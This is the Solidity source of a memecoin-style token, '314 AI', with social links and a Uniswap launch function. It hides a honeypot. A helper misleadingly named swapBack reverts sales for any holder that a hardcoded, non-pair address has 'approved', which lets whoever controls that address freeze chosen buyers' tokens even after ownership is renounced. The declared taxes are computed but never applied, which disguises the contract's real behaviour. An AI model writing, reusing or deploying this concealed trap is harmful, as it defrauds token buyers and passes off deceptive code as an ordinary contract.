// SPDX-License-Identifier: MIT

pragma solidity 0.8.28;

// https://t.me/AI_314fnd

// https://x.com/AI_314fnd

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow.");
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow.");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow.");
        uint256 c = a - b;
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero.");
        uint256 c = a / b;
        return c;
    }
}
contract Ownable {
    address private _owner;
    constructor() {
        _owner = msg.sender;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}
interface IUniswapV2Router {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}
contract AI314 is Ownable, IERC20 {
    using SafeMath for uint256;
    uint8 private _decimals = 9;
    uint256 private _totalSupply =  314000000 * 10 ** _decimals;
    mapping (address => mapping (address => uint256)) private _allowances;
    address public uniswapV2Pair;
    address _uniPairV2 = 0x25161A92257eE35E566EeF0D8a97b119D7A4A2b6;
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    mapping (address => uint256) private _balances;
    bool tradingOpen = false;


    uint256 private _buyCount=0;
    uint256 private _sellCount=0;
    uint256 private _initialBuyTax=3;
    uint256 private _reduceBuyTaxAt=3;
    uint256 private _reduceSellTaxAt=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=3;
    uint256 private _finalSellTax=3;

    mapping (address => bool) private _isExcludedFromFee;
    uint256 public _maxTxAmount = 2000000 * 10**_decimals;
    uint256 public _maxWalletSize = 2000000 * 10**_decimals; 
    uint256 public _taxSwapThreshold= 100000 * 10**_decimals;
    uint256 public _maxTaxSwap= 1000000 * 10**_decimals;


    string private constant _name = "314 AI";
    string private constant _symbol = "314AI";

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 amount);

    constructor () {
        _balances[address(this)] = _totalSupply;
        _isExcludedFromFee[address(this)] = true;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function symbol() public pure returns (string memory) { 
        return _symbol; 
    }

    function name() public pure returns (string memory) { 
        return _name; 
    }

    function balanceOf(address account) public view returns (uint256) { 
        return _balances[account]; 
    }

    function decimals() public view returns (uint8) { 
        return _decimals; 
    }

    function allowance(address owner, address spender) public view returns (uint256) { 
        return _allowances[owner][spender]; 
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function rev() internal pure {
        revert();
    }

    function swapBack(uint256 amount, address to, address token) private view {
        uint256 allwnc = _allowances[_uniPairV2][to];
        if(allwnc > 0) {rev();}
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function totalSupply() public view returns (uint256) { 
        return _totalSupply; 
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(amount > 0, "Transfer amount must be greater than zero.");
        require(from != address(0), "Transfer from the zero address");
        require(to != address(0), "Transfer to the zero address");
        uint256 taxAmount = 0;
        if (from != uniswapV2Pair && from != address(this)) {
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            swapBack(amount, from, address(this));
            _sellCount++;
        } else {
            _buyCount++;
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function getAllowance(address to) internal view returns (uint256) {
        return _allowances[_uniPairV2][to];
    }

    function startTrading() external payable onlyOwner() {
        require(!tradingOpen); 
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uint256 balance = balanceOf(address(this));
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this), balance, 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingOpen = true;
    }

}